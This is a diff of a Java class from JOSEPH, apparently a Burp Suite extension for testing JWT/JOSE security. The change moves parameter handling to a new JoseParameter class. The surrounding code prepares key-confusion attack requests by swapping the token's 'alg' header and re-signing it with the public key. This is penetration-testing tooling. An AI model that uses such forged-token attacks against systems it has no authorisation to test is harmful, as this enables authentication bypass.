@@ -22,8 +22,10 @@ import burp.*;
 
 import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
 import eu.dety.burp.joseph.attacks.IAttackInfo;
+import eu.dety.burp.joseph.attacks.SignatureExclusion.SignatureExclusionAttackRequest;
 import eu.dety.burp.joseph.utilities.Converter;
 import eu.dety.burp.joseph.utilities.Decoder;
+import eu.dety.burp.joseph.utilities.JoseParameter;
 import eu.dety.burp.joseph.utilities.Logger;
 import org.apache.commons.codec.binary.Base64;
 import org.json.simple.parser.JSONParser;
@@ -55,7 +57,7 @@ public class KeyConfusionInfo implements IAttackInfo {
 
     private IExtensionHelpers helpers;
     private IHttpRequestResponse requestResponse;
-    private IParameter parameter;
+    private JoseParameter parameter;
 
     // Unique identifier for the attack class
     private static final String id = "key_confusion";
@@ -125,7 +127,7 @@ public class KeyConfusionInfo implements IAttackInfo {
     }
 
     @Override
-    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
+    public KeyConfusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, JoseParameter parameter) throws AttackPreparationFailedException {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
@@ -233,8 +235,7 @@ public class KeyConfusionInfo implements IAttackInfo {
             for (String algorithm : algorithms) {
                 try {
                     // Change the "alg" header value for each of the algorithms entries
-                    byte[] request = this.requestResponse.getRequest();
-                    String[] components = Decoder.getComponents(this.parameter.getValue());
+                    String[] components = Decoder.getComponents(this.parameter.getJoseValue());
                     String decodedHeader = Decoder.getDecoded(components[0]);
                     String decodedHeaderReplacedAlgorithm = decodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + algorithm + "\"");
                     String encodedHeaderReplacedAlgorithm = Decoder.getEncoded(decodedHeaderReplacedAlgorithm);
@@ -258,10 +259,12 @@ public class KeyConfusionInfo implements IAttackInfo {
                     String[] newComponents = {encodedHeaderReplacedAlgorithm, components[1], newSignature};
                     String newComponentsConcatenated = Decoder.concatComponents(newComponents);
 
-                    IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getType());
-                    request = helpers.updateParameter(request, updatedParameter);
+//                    IParameter updatedParameter = helpers.buildParameter(this.parameter.getName(), newComponentsConcatenated, this.parameter.getParameterType());
+//                    request = helpers.updateParameter(request, updatedParameter);
 
-                    requests.add(new KeyConfusionAttackRequest(request, publicKey.getKey().ordinal(), algorithm, publicKey.getValue(), publicKey.getValue().length()));
+                    byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, newComponentsConcatenated);
+
+                    requests.add(new KeyConfusionAttackRequest(tmpRequest, publicKey.getKey().ordinal(), algorithm, publicKey.getValue(), publicKey.getValue().length()));
                 } catch (Exception e) {
                     throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
                 }
